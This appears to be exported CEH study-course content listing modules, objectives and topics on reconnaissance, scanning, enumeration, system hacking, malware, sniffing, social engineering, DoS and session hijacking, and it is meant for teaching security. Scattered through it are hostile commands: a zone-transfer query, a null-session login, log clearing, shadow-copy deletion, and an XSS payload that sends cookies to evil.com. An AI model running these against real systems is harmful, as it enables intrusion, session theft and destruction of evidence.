domains.name: Information Security and Ethical Hacking Overview
System Hacking Phases and Attack Techniques
Mobile Platform, IoT, and OT Hacking

modules.title: Introduction to Ethical Hacking
modules.description: Covers the fundamentals of information security, ethical hacking concepts, the five phases of hacking, and the legal and regulatory framework that governs security testing. This module lays the foundation for all subsequent CEH topics.
objectives: Understand information security fundamentals including the CIA triad and security controls
Describe the five phases of ethical hacking methodology
Differentiate between types of hackers and threat actors
Identify key information security laws, standards, and regulations
Explain the role and responsibilities of a Certified Ethical Hacker

topics.title: Information Security Fundamentals
topics.content:
Information security revolves around protecting the Confidentiality, Integrity, and Availability (CIA) of data.

  • Confidentiality ensures that data is accessible only to authorized parties.
  • Integrity ensures that data remains accurate and unmodified by unauthorized users.
  • Availability ensures that information and resources are accessible to authorized users whenever they are needed. This involves maintaining hardware, performing repairs, and keeping systems running to prevent disruptions. Denial-of-service attacks are a direct threat to availability.

Additional security concepts include Authentication, Authorization, and Non-repudiation (AAA), which form the basis of access control systems. Defense in depth is a security strategy that employs multiple layers of security controls placed throughout an information technology system, so if one layer fails, the next layer will stop the threat.

topics.title: Ethical Hacking Concepts
topics.content:
Ethical hacking involves authorized attempts to gain unauthorized access to systems to identify vulnerabilities. Hackers are typically categorized by their intent:

  • Black Hat: Hackers who violate computer security for personal gain, malicious intent, or other harmful purposes without authorization.
  • White Hat: Ethical hackers who use their skills defensively and with permission.
  • Gray Hat: Hackers who may violate laws but without malicious intent.
  • Script Kiddies: Unskilled individuals who use tools created by others.

Security testing methods differ by the knowledge provided to the tester:

  • Black Box Testing: Also known as zero-knowledge testing, performed when the tester has no prior knowledge of the target infrastructure, simulating a real-world external attacker.
  • White Box Testing: Provides full knowledge of the target environment.
  • Gray Box Testing: Provides partial knowledge of the target environment.

topics.title: Hacking Methodology and Frameworks
topics.content:
The CEH methodology defines five phases of hacking:

  • Reconnaissance (Footprinting): The first phase where the attacker gathers information without direct interaction (passive) or with interaction (active). Passive reconnaissance involves searching public records, social media, and WHOIS data.
  • Scanning: Probing the target for open ports, services, and vulnerabilities.
  • Gaining Access (Exploitation): Exploiting vulnerabilities to enter the system.
  • Maintaining Access: Establishing persistent access. In the Cyber Kill Chain, this corresponds to the Installation phase, where the attacker installs persistent backdoors or rootkits on the compromised system to maintain access, prior to Command and Control (C2).
  • Clearing Tracks: Removing evidence of the intrusion.

Frameworks like the NIST Cybersecurity Framework provide structure for defensive operations, consisting of five core functions: Identify, Protect, Detect, Respond, and Recover. The Detect function specifically focuses on developing and implementing appropriate activities to identify the occurrence of a cybersecurity event in a timely manner, including continuous monitoring and anomaly detection.

topics.title: Security Controls
topics.content:
Security controls are safeguards designed to protect information systems. They are classified into three categories:

  • Technical Controls (Logical Controls): Use technology to protect information systems. Examples include firewalls, IDS/IPS, encryption, and access control lists.
  • Administrative Controls: Involve policies, procedures, training, and risk assessments.
  • Physical Controls: Tangible safeguards like fences, locks, guards, and security cameras.

Controls can also be categorized by function: Preventive, Detective, Corrective, Deterrent, Compensating, and Recovery controls.

topics.title: Information Security Laws and Standards
topics.content:
Ethical hackers must operate within legal frameworks and understand regulations. A key component of legal testing is the Rules of Engagement (ROE) document (or Penetration Testing Agreement), which defines the scope, boundaries, methods, timelines, and legal protections for a penetration test.

Key laws and standards include:

  • Computer Fraud and Abuse Act (CFAA): The primary U.S. federal law that criminalizes unauthorized access to computer systems, fraud, and damage to computing infrastructure.
  • GDPR: European regulation for data protection.
  • HIPAA: U.S. law protecting healthcare data.
  • SOX: U.S. law covering financial reporting.
  • PCI DSS: Standard for payment card data security.

modules.title: Footprinting and Reconnaissance
modules.description: Explores passive and active reconnaissance techniques used to gather information about target organizations, including OSINT, DNS footprinting, Whois lookups, and social media intelligence gathering.
objectives: Perform passive and active reconnaissance against a target
Use OSINT tools and techniques to gather intelligence
Conduct DNS and Whois footprinting
Extract information from social media, websites, and email headers
Understand countermeasures against footprinting

topics.title: OSINT (Open Source Intelligence)
topics.content:
OSINT involves collecting publicly available information about a target from open sources.

  • Google Dorking: Uses advanced search operators. For example, the operator site:target.com filetype:pdf combines site: (restricts to domain) and filetype: (filters for a specific extension) to find exposed PDF files.
  • theHarvester: An OSINT tool specifically designed for harvesting email addresses, subdomains, hosts, and employee names from public sources like search engines, PGP key servers, and SHODAN.
  • Maltego: A powerful OSINT and link analysis tool that provides graphical visualization of relationships between entities (people, companies, domains, IP addresses, infrastructure).

topics.title: DNS Footprinting
topics.content:
DNS footprinting involves querying DNS servers to map out infrastructure.

  • nslookup: A command-line tool used to query DNS servers for various record types including A, MX (mail exchange), NS (name server), CNAME, and SOA records.
  • Zone Transfers: If misconfigured, a DNS server may allow a full zone transfer (AXFR), exposing the complete list of DNS records. This can be accomplished using commands like: dig axfr target.com @dns-server, nslookup -type=AXFR target.com dns-server, or host -l target.com dns-server.
  • Subdomain Enumeration: Subdomains expand the attack surface. Techniques like DNS enumeration and subdomain brute-forcing (using tools like Sublist3r, Amass, and dnsrecon) or checking certificate transparency logs can reveal hidden services and development servers.

topics.title: Whois and Network Footprinting
topics.content:
WHOIS is a query and response protocol used to look up domain registration information. It provides vital details during reconnaissance, including:

  • Registrant's name and organization
  • Contact information (email, phone number)
  • Registration and expiration dates
  • Name servers

Network footprinting also involves using traceroute to map network paths and identifying network ranges through Regional Internet Registries (RIRs).

topics.title: Website and Email Footprinting
topics.content:
Website footprinting involves examining a target's web presence.

  • Passive Web Footprinting: The Wayback Machine (web.archive.org) is a powerful tool for passive footprinting. It stores historical snapshots of websites, revealing old versions of a target's site without direct interaction, which may expose previously published content, employee info, or deprecated technologies.
  • Banner Grabbing / Header Analysis: HTTP response headers can reveal specific software versions (e.g., X-Powered-By: PHP/7.4.3 or Server: Apache/2.4.41). Attackers use this information to search vulnerability databases (like CVE) for known exploits targeting those exact versions.

topics.title: Social Media Intelligence (SOCMINT)
topics.content:
Social media platforms are rich sources of intelligence. Passive reconnaissance often involves searching for the target company and its employees on platforms like LinkedIn and Glassdoor. Because this uses publicly available information without direct interaction with the target's systems, it is strictly passive.

This information helps attackers map organizational structures, identify technologies used (from job postings), and gather personal details that can be leveraged in social engineering attacks.

v13Updates: Advanced OSINT with machine learning classifiers

modules.title: Scanning Networks
modules.description: Covers network scanning methodologies including host discovery, port scanning, service enumeration, OS fingerprinting, and vulnerability scanning using tools like Nmap.
objectives: Explain the different types of network scans and their purposes
Perform host discovery, port scanning, and service detection using Nmap
Understand TCP/IP communication and the three-way handshake
Conduct OS fingerprinting and banner grabbing
Identify scanning countermeasures

topics.title: Network Scanning Methodology & Port Responses
topics.content:
Network scanning identifies live systems, open ports, and services. Understanding TCP/IP communication is crucial.

  • Common Ports: Port 443 is the well-known port for HTTPS (HTTP over TLS/SSL). Port 80 is HTTP, 8080 is an alternative HTTP, and 22 is SSH.
  • Port States and Responses: When an open port receives a TCP SYN packet, it responds with SYN-ACK. When a closed port receives a TCP SYN packet, it responds with a RST-ACK (Reset-Acknowledge) packet.
  • Firewall Filtering: If a host responds to a probe with an ICMP Type 3, Code 13 (Communication Administratively Prohibited), it indicates that a firewall or packet filtering device is actively blocking the traffic and rejecting specific packets, rather than silently dropping them.

topics.title: Nmap Scan Types and Techniques
topics.content:
Nmap provides numerous scan techniques tailored for different scenarios:

  • SYN Stealth Scan (-sS): Performs a half-open scan by sending SYN packets and analyzing the response without completing the three-way handshake, making it less likely to be logged.
  • XMAS Scan (-sX): Sends TCP packets with the FIN, PSH, and URG flags set (lit up like a Christmas tree). It can bypass some stateless firewalls. Closed ports should respond with RST, while open/filtered ports do not respond.
  • Idle Scan (-sI): Uses a zombie host as a proxy to scan the target. The attacker sends spoofed packets using the zombie's IP and monitors changes in the zombie's IP ID sequence. This is the stealthiest Nmap scan because no packets are sent directly from the attacker to the target.
  • Timing Templates: The -T5 (Insane) timing template is the fastest scan speed but generates a high volume of rapid traffic, making it the most likely to be detected by IDS/IPS.

topics.title: OS Fingerprinting and Banner Grabbing
topics.content:
Identifying the operating system and running services is critical for finding targeted vulnerabilities.

  • OS Fingerprinting (nmap -O): The -O flag enables OS detection. Nmap analyzes responses to specially crafted TCP/IP probes (TCP ISN sampling, IP ID sequences, stack characteristics) to determine the target's operating system.
  • Banner Grabbing: The primary purpose of banner grabbing (using nmap -sV, Netcat, or Telnet) is to connect to an open port and read the welcome message or headers to identify the service name, version number, and operating system running on that port.

topics.title: Vulnerability Scanning with Nmap
topics.content:
The Nmap Scripting Engine (NSE) allows Nmap to perform advanced vulnerability scanning. By using scripts like --script=vuln, attackers can identify known flaws.

For example, if a scan against port 445 returns smb-vuln-ms17-010: VULNERABLE, it indicates the target is vulnerable to EternalBlue, a critical SMB remote code execution exploit (CVE-2017-0144) notoriously used in WannaCry and NotPetya attacks. This means the system is missing critical security patches.

v13Updates: Automated vulnerability correlation with threat intelligence

modules.title: Enumeration
modules.description: Details the techniques used to extract detailed information from target systems including usernames, network shares, services, and configurations through various enumeration protocols.
objectives: Understand the purpose and techniques of enumeration
Perform NetBIOS, SNMP, LDAP, and DNS enumeration
Enumerate SMB shares, NFS exports, and SMTP users
Conduct Active Directory enumeration
Apply enumeration countermeasures

topics.title: Enumeration Concepts
topics.content:
Enumeration is the process of actively connecting to a target system to extract detailed information such as usernames, group names, network shares, services, DNS details, and application banners. Unlike passive reconnaissance, enumeration involves direct and active interaction with the target.

Different protocols reveal different types of data when enumerated.

topics.title: NetBIOS and SMB Enumeration
topics.content:
SMB and NetBIOS enumeration are critical in Windows environments.

  • NetBIOS Suffix Codes: These codes identify services. The <00> suffix identifies the Workstation Service. <20> represents the Server (File Sharing) service.
  • Null Sessions: An attacker can establish an anonymous connection using the command net use \\target\IPC$ "" /u:"". The purpose is to enumerate users, shares, and groups without credentials through the IPC$ (Inter-Process Communication) share.
  • Administrative Shares: During SMB enumeration, finding the C$ share accessible indicates access to the default administrative share for the C: drive, a hidden share meant for administrators.
  • enum4linux: This tool enumerates Windows/Samba systems primarily by leveraging the SMB/CIFS protocol (via RPC calls over named pipes). It can perform "RID cycling" to enumerate accounts like Administrator (RID 500) and Guest (RID 501).

topics.title: SNMP Enumeration
topics.content:
Simple Network Management Protocol (SNMP) uses UDP port 161. When improperly configured, it can reveal extensive system information, network interfaces, routing tables, and running processes.

SNMPv1 and v2c rely on community strings for access control. The default read-only string is typically public. The default read-write community string is private; if left at this default value, it allows an attacker to not only read but also modify device configurations, creating a critical vulnerability.

topics.title: LDAP and DNS Enumeration
topics.content:
LDAP Enumeration: The ldapsearch command-line utility is commonly used to query LDAP (ports 389/636) to extract detailed information about users, groups, and organizational units (OUs) from Active Directory.

DNS Enumeration: DNS enumeration maps infrastructure. When enumerating DNS, an attacker may discover an AAAA record, which specifically maps a hostname to a 128-bit IPv6 address (as opposed to an A record for IPv4).

topics.title: RPC and NFS Enumeration
topics.content:
Network File System (NFS) misconfigurations often lead to data exposure.

Using the command showmount -e target allows an attacker to list available NFS exports on a remote server. The primary security concern arises when an export list contains a wildcard (*), meaning the NFS share allows mounting by any host, leading to unauthorized access to sensitive files and directories.

v13Updates: Cloud directory enumeration (Azure AD, AWS IAM)

modules.title: Vulnerability Analysis
modules.description: Explains vulnerability assessment concepts, scoring systems like CVSS, vulnerability scanning tools, and the vulnerability management lifecycle from discovery to remediation.
objectives: Understand vulnerability assessment concepts and types
Explain CVSS scoring and vulnerability classification
Use vulnerability scanning tools like Nessus and OpenVAS
Differentiate between vulnerability assessments and penetration tests
Describe the vulnerability management lifecycle

topics.title: Vulnerability Assessment Concepts
topics.content:
A vulnerability assessment identifies, quantifies, and reports vulnerabilities in a system. The key difference between a vulnerability assessment and a penetration test is that a penetration test goes a step further and actively exploits vulnerabilities to demonstrate real-world impact.

During scanning, a tool may incorrectly report a vulnerability that does not actually exist on the target system. This type of result is known as a False Positive.

topics.title: CVSS (Common Vulnerability Scoring System)
topics.content:
CVSS stands for the Common Vulnerability Scoring System. Its purpose is to rate the severity of vulnerabilities on a scale from 0.0 to 10.0.

  • Severity Classification (v3.1): A CVSS base score of 9.8 is classified as Critical (Critical range is 9.0 - 10.0).
  • Temporal Metrics: The CVSS metric group that measures characteristics of a vulnerability that change over time (such as the availability of exploit code or patches) is the Temporal Metrics group.

topics.title: Vulnerability Scanning Tools and Techniques
topics.content:
Automated tools scan for known weaknesses:

  • Nessus: A widely-used commercial vulnerability scanner that identifies vulnerabilities, misconfigurations, and compliance issues.
  • OpenVAS (Greenbone): An open-source vulnerability scanner that serves as a popular alternative to commercial solutions like Nessus.

Scans can be credentialed or non-credentialed. Credentialed scans authenticate to the system and provide significantly more accurate results because they can detect missing patches, local misconfigurations, and installed software that non-credentialed external scans would miss.

topics.title: Vulnerability Management and Remediation
topics.content:
Organizations must manage vulnerabilities continually. Continuous vulnerability management is the strategy of continuously monitoring the network for new vulnerabilities (ongoing, automated scanning) rather than relying solely on periodic, one-time assessments.

When a scan reveals a critical legacy issue, such as CVE-2014-0160 (Heartbleed) in OpenSSL, the most appropriate next step for an analyst is to verify the finding manually, prioritize patching to the latest secure OpenSSL version, and revoke/reissue affected SSL certificates since private keys may have been compromised.

modules.title: System Hacking
modules.description: Covers the core techniques for compromising systems including password cracking, privilege escalation, maintaining persistent access, steganography, and covering tracks.
objectives: Understand password cracking techniques and tools
Perform horizontal and vertical privilege escalation
Establish persistent access using backdoors and rootkits
Hide data using steganography and alternate data streams
Clear tracks by modifying logs and timestamps

topics.title: Password Cracking Techniques
topics.content:
Password cracking is a fundamental phase in system hacking aimed at recovering plain-text passwords from stored hashes or intercepted network traffic.

  • Offline Password Cracking: Attackers often prefer offline cracking because it does not generate network traffic or trigger account lockouts. A prime tool for this is John the Ripper, which tests captured password hashes against wordlists and applies mangling rules.
  • Brute Force vs. Dictionary Attacks: A brute force attack systematically attempts every possible combination of characters until the correct password is found. While guaranteed to work eventually, it is extremely slow. A dictionary attack relies on a precompiled list of common words and passwords.
  • Windows SAM Database: In Windows environments, local user credentials are stored as NTLM hashes in the Security Account Manager (SAM) database (C:\Windows\System32\config\SAM). Accessing this database is a primary goal for attackers.
  • Pass-the-Hash (PtH): Instead of cracking the hash, attackers can use the NTLM hash directly to authenticate to other Windows systems on the network. This powerful technique bypasses the need to know the plaintext password altogether.

topics.title: Privilege Escalation
topics.content:
Once initial access is gained, an attacker often finds themselves with limited privileges. Privilege escalation is the process of exploiting vulnerabilities, misconfigurations, or design flaws to gain higher-level access.

  • Vertical vs. Horizontal Escalation: Vertical escalation involves elevating a lower-privileged account to administrative or root rights. Horizontal escalation involves accessing another user's account and resources at the same privilege level.
  • SUID Binaries in Linux: A critical misconfiguration in Linux involves SUID (Set User ID) binaries owned by root. When an SUID binary has a vulnerability, such as a buffer overflow, exploiting it will spawn a shell or process running with the file owner's privileges (root), granting full system control.
  • /etc/passwd Vulnerability: In modern Linux systems, password hashes should be safely stored in /etc/shadow. If a penetration tester finds actual hashed passwords in /etc/passwd instead of the expected 'x' placeholder, it indicates that shadow passwords are not enabled. Since /etc/passwd is world-readable, this is a significant security weakness that allows any local user to perform offline cracking.

topics.title: Maintaining Access
topics.content:
After successfully elevating privileges, attackers strive to establish persistent access. This ensures that even if the system is rebooted or the compromised credentials are changed, the attacker can seamlessly reconnect.

  • Backdoors and Trojans: Attackers deploy malicious software that listens on hidden ports, providing remote command execution without requiring traditional authentication.
  • Rootkits: These are sophisticated malware designed to hide the existence of processes, files, or network connections from the operating system, operating either in user-mode or kernel-mode.
  • Alternative Access Mechanisms: Attackers frequently create hidden administrator accounts, configure scheduled tasks, or modify registry run keys to guarantee their payloads are executed automatically upon system startup.

topics.title: Steganography
topics.content:
Steganography is the practice of concealing secret data within ordinary, non-secret files or messages (carrier files) to avoid detection.

  • Concept: Unlike cryptography, which scrambles data to make it unreadable, steganography hides the very existence of the data. To an observer, the file simply looks like a normal image or audio track.
  • Techniques and Tools: Data can be hidden in images, audio, video, or even whitespace in text documents. Common techniques include Least Significant Bit (LSB) insertion. Tools widely used for this purpose include OpenStego, Steghide, and Snow.

topics.title: Covering Tracks
topics.content:
The final phase of system hacking involves removing evidence of the unauthorized access to evade detection by security teams and hinder forensic investigations.

  • Clearing Windows Event Logs: Attackers routinely clear the Security, System, and Application event logs to destroy records of failed logins, process creations, and privilege changes. This can be achieved using commands like wevtutil cl Security or the Meterpreter command clearev.
  • Deleting Volume Shadow Copies: On Windows systems, attackers (and notably ransomware operators) use commands like wmic shadowcopy delete to delete Volume Shadow Copies. This prevents system recovery and removes forensic evidence stored in those backup snapshots.
  • Other Methods: Attackers also clear bash history on Linux systems, modify file timestamps (Timestomping), and disable auditing policies.

modules.title: Malware Threats
modules.description: Examines types of malware including viruses, worms, Trojans, ransomware, and APTs. Covers malware analysis techniques and evasion strategies.
objectives: Classify different types of malware and their characteristics
Understand Advanced Persistent Threats (APTs) and their lifecycle
Explain fileless malware techniques and evasion methods
Perform basic static and dynamic malware analysis
Identify anti-malware countermeasures and solutions

topics.title: Types of Malware
topics.content:
Understanding the fundamental behavior of different malicious software is critical for threat detection and response.

  • Trojan: Named after the Trojan Horse, this malware disguises itself as legitimate or desirable software to trick users into installing it. Unlike viruses, Trojans do not self-replicate. They typically open backdoors for remote access.
  • Worm vs. Virus: A virus attaches itself to legitimate files and requires user interaction (like executing a program) to spread. A worm, however, is standalone malware that can self-replicate and spread rapidly across networks automatically, requiring no user interaction.
  • Ransomware: This malicious software encrypts the victim's files and demands payment (usually in cryptocurrency) for the decryption key. Modern variants often use double extortion—encrypting the data and threatening to leak sensitive information publicly if the ransom is not paid.
  • Dropper: Often delivered via phishing, a dropper is a preliminary piece of malware (like a malicious document with a macro) designed solely to connect to a remote server, download, and install a more destructive second-stage payload.

topics.title: Advanced Persistent Threats (APTs)
topics.content:
Advanced Persistent Threats (APTs) are sophisticated, targeted, and prolonged cyberattacks typically orchestrated by well-funded groups, such as nation-states.

  • Characteristics: APTs are characterized by a long dwell time—meaning the attackers remain patient and operate stealthily inside a corporate network for months or even years without detection.
  • Objectives: Rather than causing immediate disruption, APTs focus on specific targets to systematically exfiltrate highly sensitive data, intellectual property, or strategic intelligence.

topics.title: Fileless Malware
topics.content:
Fileless malware is an advanced memory-based attack technique that leaves little to no footprint on the hard drive.

  • Mechanism: Instead of writing executable files to disk, fileless malware operates entirely in RAM. It leverages legitimate, built-in system administration tools—often referred to as Living-off-the-Land Binaries (LOLBins)—such as PowerShell, WMI, or the Windows Registry to execute its malicious code.
  • Evasion: Because there are no traditional malicious files to scan, fileless malware easily evades signature-based antivirus detection. Combating it requires advanced behavioral analysis and Endpoint Detection and Response (EDR) solutions.

topics.title: Malware Analysis Techniques
topics.content:
Malware analysis is essential for understanding how a specific threat operates and how to defend against it.

  • Static Analysis: Examining the malicious file without executing it. This involves reviewing file hashes, extracting strings, inspecting PE headers, and reverse-engineering the code.
  • Dynamic (Behavioral) Analysis: This involves executing the malware in a controlled, isolated virtual environment (a sandbox, such as Cuckoo Sandbox) to observe its real-time behavior. Analysts monitor file system changes, registry modifications, process creation, and network connections.

topics.title: Malware Evasion and Countermeasures
topics.content:
Malware authors continuously develop sophisticated techniques to bypass security controls and analysis environments.

  • Polymorphic Malware: This type of malware changes its underlying code, encryption, or appearance with each replication or infection. While its core function remains the same, its unique signature changes every time, rendering traditional signature-based antivirus completely ineffective.
  • Sandbox Evasion / Anti-Analysis: Advanced malware checks its environment before executing the payload. If it detects virtual machine artifacts (like specific MAC addresses or driver names), debugging tools, or sandbox environments, it will remain dormant or terminate itself to avoid behavioral detection.
  • Kernel-Level Rootkits: These operate deep within the OS kernel by hooking system calls. This allows them to effectively hide malicious processes, files, and network activity from user-space security tools, making them notoriously difficult to detect and remove.

modules.title: Sniffing
modules.description: Covers packet sniffing concepts, network traffic analysis, and common Layer 2 attacks including ARP spoofing, MAC flooding, and DNS poisoning techniques.
objectives: Differentiate between active and passive sniffing
Understand switched network sniffing techniques
Perform ARP spoofing and MAC flooding attacks
Analyze network traffic using Wireshark
Implement sniffing countermeasures

topics.title: Packet Sniffing Concepts
topics.content:
Packet sniffing involves capturing and inspecting network traffic as it travels across a network.

  • Hubs vs. Switches: On older hub-based networks, all traffic is broadcast to every port, making passive sniffing trivial. Modern networks use switches, which forward traffic only to the specific destination port based on MAC address tables. To sniff on a switched network, an attacker must use active sniffing techniques.
  • Wireshark: The industry standard for network protocol analysis. It captures packets in real-time. Analysts use display filters to isolate specific traffic. For example, using the filter http.request.method == "GET" explicitly isolates HTTP GET requests for analysis.
  • HTTPS Encryption: When performing a Man-in-the-Middle (MITM) attack, tools like Ettercap can intercept traffic. However, if the traffic is HTTPS (encrypted via TLS/SSL), the packet contents remain unreadable to the attacker unless advanced techniques like SSL stripping or certificate spoofing are successfully deployed.

topics.title: ARP Spoofing and Poisoning
topics.content:
ARP (Address Resolution Protocol) resolves IP addresses to MAC addresses on a local network. Because ARP is stateless and lacks authentication, it is highly vulnerable.

  • The Attack: ARP spoofing involves an attacker sending forged ARP replies onto the network. The goal is to maliciously associate the attacker's MAC address with the IP address of a legitimate host, most commonly the default gateway.
  • Impact: This redirects traffic intended for the gateway through the attacker's machine, establishing a Man-in-the-Middle (MITM) position for sniffing or manipulation.
  • Detection: A strong indicator that an ARP spoofing attack is actively occurring is when a network analyst observes multiple IP addresses resolving to the exact same MAC address in their ARP cache.

topics.title: MAC Flooding and DHCP Attacks
topics.content:
Attackers manipulate fundamental Layer 2 protocols to compromise network integrity.

  • MAC Flooding: A switch relies on its Content Addressable Memory (CAM) table to map MAC addresses to physical ports. A MAC flooding attack sends thousands of Ethernet frames with randomized, spoofed source MAC addresses. When the CAM table overflows, the switch can no longer learn new mappings, forcing it into a 'fail-open' mode where it behaves like a hub—broadcasting all traffic to all ports, thereby enabling the attacker to sniff the network.
  • DHCP Spoofing: In this attack, an adversary introduces a rogue DHCP server into the network. This rogue server races to respond to client DHCP requests, distributing malicious configuration parameters such as a fake default gateway or a malicious DNS server address to hijack client traffic.

topics.title: DNS Poisoning
topics.content:
DNS poisoning, or DNS cache poisoning, compromises the integrity of domain name resolution.

  • Mechanism: The attacker targets a recursive DNS resolver by sending forged DNS responses before the legitimate authoritative server can reply. This injects false records into the resolver's cache.
  • Impact: Consequently, any subsequent user querying that poisoned resolver for the targeted domain (e.g., a bank's website) will be seamlessly redirected to the attacker's malicious server, facilitating severe phishing or malware delivery attacks.

topics.title: Sniffing Countermeasures
topics.content:
Defending against sniffing and Layer 2 attacks requires robust network configuration and encryption.

  • Dynamic ARP Inspection (DAI): To prevent ARP spoofing, managed switches can be configured with DAI. This security feature validates intercepted ARP packets against a trusted database (like a DHCP snooping binding table) and drops invalid IP-to-MAC bindings.
  • DHCP Snooping: Prevents rogue DHCP servers by designating only specific switch ports as trusted for DHCP server messages.
  • Port Security: Mitigates MAC flooding by limiting the number of secure MAC addresses permitted on a single switch port.

modules.title: Social Engineering
modules.description: Explores human-based and computer-based social engineering attacks, including phishing, pretexting, impersonation, and the growing threat of AI-powered deepfakes.
objectives: Identify different types of social engineering attacks
Understand the psychology behind social engineering
Recognize phishing, spear phishing, and whaling techniques
Explain AI-powered social engineering threats including deepfakes
Implement social engineering countermeasures and awareness training

topics.title: Human-Based Social Engineering
topics.content:
Human-based attacks exploit psychological manipulation and direct human interaction to bypass technical security controls.

  • Tailgating / Piggybacking: A physical security breach where an unauthorized individual closely follows an authorized employee through a secured door or turnstile without presenting their own credentials.
  • Pretexting: The attacker fabricates a compelling scenario or assumes a false identity (e.g., an auditor or IT technician) to manipulate the victim into divulging sensitive information or performing an action.
  • Baiting: Exploits human curiosity. A classic example is leaving infected USB drives labeled with enticing titles (like 'Q4 Salary Information') in a company parking lot, hoping an employee will plug it into a corporate workstation.
  • Psychological Principles: Attackers heavily rely on psychological triggers. The Authority principle is frequently used by impersonating executives or law enforcement to pressure victims into compliance. Vishing (voice phishing) calls often combine Authority, Urgency (a critical issue needs fixing), and Helpfulness (the victim's desire to assist support staff) to extract credentials.

topics.title: Phishing Attacks
topics.content:
Phishing remains one of the most prevalent and effective vectors for initial network compromise.

  • Phishing vs. Spear Phishing: General phishing casts a wide, untargeted net with generic fraudulent emails designed to look legitimate. Spear phishing, however, is highly customized and directed at specific individuals or organizations using thoroughly researched background information.
  • Whaling and BEC: Whaling is a form of spear phishing targeting high-profile individuals like CEOs or CFOs. When attackers impersonate executives to authorize fraudulent financial transactions (e.g., referencing a recent board meeting to request an urgent wire transfer), it is classified as Business Email Compromise (BEC), resulting in massive financial losses globally.

topics.title: AI-Powered Social Engineering & Deepfakes
topics.content:
The integration of Artificial Intelligence has dramatically elevated the sophistication of social engineering attacks.

  • Deepfakes and Impersonation: Attackers now utilize AI-generated deepfake technology to create hyper-realistic video and audio. A prominent emerging threat involves deepfake video calls where attackers convincingly impersonate a company's CEO to instruct finance departments to execute massive, unauthorized wire transfers.
  • Impact: This threat represents a dangerous convergence of deepfake technology, the psychological principle of authority, and sophisticated impersonation, rendering traditional verification methods obsolete.

topics.title: Social Engineering Countermeasures
topics.content:
Because social engineering targets human psychology rather than software flaws, defense requires a combination of education, testing, and strict policies.

  • Primary Defenses: The most effective countermeasures include comprehensive, regular security awareness training and conducting periodic phishing simulations to test and educate the workforce.
  • Verification Procedures: For highly targeted attacks like BEC and deepfake impersonations, organizations must implement strict, out-of-band verification procedures (like requiring a separate phone call to an established number) for any significant financial transactions or sensitive data transfers.

modules.title: Denial-of-Service
modules.description: Covers DoS and DDoS attack concepts, techniques, and tools including volumetric, protocol, and application-layer attacks, along with mitigation strategies.
objectives: Differentiate between DoS and DDoS attacks
Classify attack types: volumetric, protocol, and application-layer
Understand botnet architecture and amplification techniques
Explain specific attacks like SYN flood, UDP flood, and Slowloris
Implement DoS/DDoS detection and countermeasures

topics.title: DoS vs. DDoS and Botnets
topics.content:
Denial-of-Service attacks aim to render a target system, network, or application unavailable to its legitimate users.

  • DoS vs. DDoS: A Denial-of-Service (DoS) attack originates from a single source system. In contrast, a Distributed Denial-of-Service (DDoS) attack leverages multiple distributed, compromised systems to simultaneously flood the target, making it vastly more powerful and difficult to block using simple IP blacklists.
  • Botnets: DDoS attacks are typically executed using a botnet—a massive network of compromised computers or IoT devices (zombies) controlled remotely by a botmaster. The infamous Mirai botnet notoriously targeted Linux-based IoT devices (like cameras and routers) by exploiting factory-default credentials over open Telnet ports.

topics.title: Volumetric and Protocol Attacks
topics.content:
These attacks focus on exhausting network bandwidth or the processing capacity of network infrastructure.

  • SYN Flood: A classic protocol attack that exploits the TCP three-way handshake. The attacker sends a massive volume of SYN requests but intentionally never completes the final ACK. The server allocates connection state resources for these half-open connections, eventually exhausting its connection table and crashing.
  • Smurf Attack: An attacker sends ICMP echo requests (pings) to a network's broadcast address, but spoofs the source IP address to be that of the victim. Every host on the broadcast network replies to the victim, creating a massive amplification of traffic.
  • DNS Amplification: The attacker sends small DNS queries to open recursive resolvers with the victim's IP spoofed as the source. Because DNS responses (especially with DNSSEC) are significantly larger than the queries (often 28-54 times larger), the resolvers flood the victim with massive responses. For example, high volumes of UDP packets targeting port 53 with large response sizes strongly characterize a DNS amplification attack.

topics.title: Application Layer Attacks
topics.content:
Layer 7 (Application Layer) attacks are designed to exhaust the resources of specific applications or web servers rather than raw network bandwidth.

  • HTTP Floods (Slowloris and RUDY): These attacks send seemingly legitimate HTTP requests that consume server resources. Slowloris operates by sending partial HTTP requests very slowly to keep numerous connections open on the web server, eventually exhausting the server's concurrent connection pool without requiring high attacker bandwidth.

topics.title: DoS/DDoS Countermeasures
topics.content:
Mitigating modern DDoS attacks requires robust infrastructure and specialized techniques.

  • Content Delivery Networks (CDNs): Deploying a CDN (like Cloudflare or Akamai) is a highly effective defense against DDoS. CDNs distribute web traffic across massive global networks of edge servers, successfully absorbing volumetric attacks and filtering out malicious requests before they can ever reach the origin server.
  • SYN Cookies: To defend specifically against SYN floods, servers can implement SYN cookies. Instead of allocating memory for every incoming SYN request, the server encodes the connection state into the TCP sequence number of the SYN-ACK response. It only allocates resources if a valid final ACK is received, completely neutralizing the resource exhaustion vector of the attack.

modules.title: Session Hijacking
modules.description: Covers techniques for intercepting and taking over authenticated user sessions at both the network and application level, including session token prediction, XSS-based theft, and session fixation.
objectives: Understand session hijacking concepts at network and application layers
Explain session token prediction and brute-forcing techniques
Perform XSS-based session theft and session fixation attacks
Describe man-in-the-browser and cross-site request forgery attacks
Implement session management countermeasures

topics.title: Session Hijacking Concepts
topics.content:
Session hijacking aims to take over an established session between a user and a server by stealing, predicting, or manipulating a valid session token. This allows the attacker to impersonate the legitimate user without needing their credentials directly. Hijacking occurs at both the network layer and the application layer.

  • Active Hijacking: Taking over an existing session and interacting with the server.
  • Passive Hijacking: Monitoring the session silently.

topics.title: Application-Level Session Attacks
topics.content:
Application-level hijacking targets session mechanisms (cookies, URL parameters, hidden form fields).

  • Session Fixation: The attacker forces a predetermined, known session ID onto a victim before they authenticate. If the server regenerates the session ID after successful login but fails to invalidate the old session ID, the attacker can continue using the fixed ID to access the authenticated session.
  • Session Prediction: Exploits weak token generation algorithms. For instance, tokens constructed from predictable values like a username plus a current timestamp (e.g., admin1689456000) are highly vulnerable to session prediction attacks.
  • XSS-based Cookie Theft: Stored XSS attacks can steal session cookies. An attacker injects a malicious script (e.g., <script>document.location='http://evil.com/steal.php?c='+document.cookie;</script>) that reads the victim's cookies via document.cookie and sends them to the attacker.
  • Man-in-the-Browser (MitB): A Trojan operates inside the victim's browser process, intercepting and modifying web page content and transactions in real-time before they are encrypted by SSL/TLS. This defeats HTTPS protections.
  • Session Replay: Attackers use proxy tools like Burp Suite to intercept and replay a session token captured from an authenticated user.

topics.title: Network-Level Session Hijacking
topics.content:
Network-level session hijacking involves intercepting transport-layer connections.

